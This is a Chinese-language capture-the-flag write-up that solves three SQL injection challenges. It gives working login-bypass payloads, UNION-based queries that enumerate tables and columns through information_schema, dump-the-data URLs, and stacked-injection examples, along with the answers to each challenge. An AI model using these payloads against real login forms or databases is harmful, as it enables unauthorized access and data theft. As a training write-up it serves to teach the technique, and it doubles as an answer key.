## 极客大挑战 easysql

本题比较简单，用户登录界面存在 sql 注入，通过 sql 注入 或 永真语句 达到绕过密码检查的目的。
sql 注入时，需要检查是数字型注入还是字符型注入，二者的主要区别是是否需要匹配引号。

```sql
' or '1' = '1 ' 
or 1=1 --' 
' or 1=1# 
```

##  Lovesql

同样存在 sql 注入漏洞。
sql 注入登录后使用 union 语句查看回显点

```sql
# 判断回显点位 
/check.php?username=1' union select 1,2,3%23&password=1   
# 查询有哪些表 
/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 &password=1   
# 查询geekuser有哪些字段 
/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23&password=1

# 本题答案
/check.php?username=1' union select 1,id,username from l0ve1ysq1%23&password=1

```

几个做题的关键点，首先要定位回显点，然后是数据库隐私数据读取和显示。

首先读取数据库信息，如表名，列名。然后将所有能读取的数据读取出来。

推测原始sql语句如下：

```mysql
select username = '用户输入' and password = '用户输入'
```

## SUCTF 2019 Easysql

使用开发者工具发现sql注入通过 post 数据包的 query 字段传输。

输入字符串或者 0 字符均无显示，输入非 0 数字有显示，证明语句中可能存在 ||  (逻辑或)

猜测 sql 拼接语句如下：

```sql
select 用户输入 || flag from table;
```

使用 * 查询出数据库中的全部内容。

```mysql
# 答案
*,1
```

本题还能使用`堆叠注入`查看数据库中的信息，但是由于 flag个关键字被过滤了，因此无法直接读取 flag 表格。

```mysql
1;show databases;
1;show tables; 
```

## 一些相关知识

- information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。
  TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。
- database 函数: 返回数据库名称
- GROUP_CONCAT(expr) 函数会从 expr 中连接所有非 NULL 的字符串
-  || 逻辑或当操作数为 0（假） ，则返回值为 0，否则为真，返回值为1值为 0。但是有一点除外，那就是 NOT NULL 的返回值为 NULL 
## 参考文献

- [关于MySQL数据库的information_schema等的解释 ]()